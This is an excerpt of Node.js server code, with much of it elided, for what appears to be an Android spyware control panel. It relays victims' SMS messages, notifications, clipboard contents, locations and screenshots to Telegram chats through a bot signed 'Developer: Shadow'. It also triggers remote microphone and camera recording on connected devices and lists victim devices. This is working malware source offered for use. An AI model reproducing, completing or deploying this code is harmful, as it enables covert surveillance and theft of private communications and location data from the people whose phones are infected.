...
app.post('/api/upload/text', function(req, res) {
    ...
    sendToAllIds('Message from ' + deviceInfo.model + ' device: ' + text, { parse_mode: 'HTML' });
...
app.post('/api/upload/location', function(req, res) {
    ...
    sendToAllIds('Location from ' + deviceInfo.model + ' device. Lat: ' + lat + ' Lon: ' + lon, { parse_mode: 'HTML' });
    ...
    try {
        ...
        ids.forEach(function(chatId) {
            appBot.sendPhoto(chatId, buffer, {
                caption: 'Screenshot - ' + deviceInfo.model + ' ' + new Date().toLocaleString(),
                parse_mode: 'HTML'
            }).catch(function() {});
        });
    ...
    ws.on('message', function(data) {
        try {
            ...
            if (msg.type === 'screenshot') {
                try {
                    ...
                    ids.forEach(function(chatId) {
                        appBot.sendPhoto(chatId, screenshotBuffer, {
                            caption: 'Auto Screenshot - ' + model + ' ' + new Date().toLocaleString(),
                            parse_mode: 'HTML'
                        }).catch(function() {});
                    });
                    saveScreenshot({
                ...
                sendToAllIds('New SMS from ' + model + ' From: ' + msg.from + ' Body: ' + msg.body, { parse_mode: 'HTML' });
                saveMessage({
                    type: 'sms',
                    device: model,
                    uuid: uuid,
                ...
                sendToAllIds('Notification from ' + model + ' App: ' + msg.app + ' Title: ' + msg.title + ' Content: ' + msg.content, { parse_mode: 'HTML' });
                saveNotification({
                    device: model,
                    uuid: uuid,
                    app: msg.app,
                ...
                sendToAllIds('Device Info from ' + model + ' ' + JSON.stringify(msg.data, null, 2), { parse_mode: 'HTML' });
            }
            else if (msg.type === 'location') {
                sendLocationToAllIds(msg.lat, msg.lon);
                sendToAllIds('Location from ' + model + ' Lat: ' + msg.lat + ' Lon: ' + msg.lon, { parse_mode: 'HTML' });
            }
            else if (msg.type === 'clipboard') {
                sendToAllIds('Clipboard from ' + model + ' ' + msg.text, { parse_mode: 'HTML' });
            }
        } catch (e) {
...
appBot.on('message', function(message) {
    ...
    if (message.text === '/start') {
        appBot.sendMessage(chatId,
            ...
            'Developer: Shadow' + '\n' +
            'Commands: /start /devices /online /messages /status',
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
        ...
        if (appClients.size === 0) {
            ...
            appClients.forEach(function(value) {
                text += 'Model: ' + value.model + ' Battery: ' + value.battery + ' Android: ' + value.version + '\n';
            });
        ...
        if (online.length === 0) {
            ...
            online.forEach(function(d) {
                text += 'Model: ' + d.model + ' Battery: ' + d.battery + '\n';
            });
            appBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
        }
    }
...
function handleReplyMessage(message) {
    ...
    if (replyText.includes('Please reply the number')) {
    ...
    else if (replyText.includes('Enter how long you want the microphone')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
    ...
    else if (replyText.includes('Enter how long you want the main camera')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
    ...
    else if (replyText.includes('Enter how long you want the selfie camera')) {
        appSocket.clients.forEach(function(ws) {
            if (ws.uuid === currentUuid) {
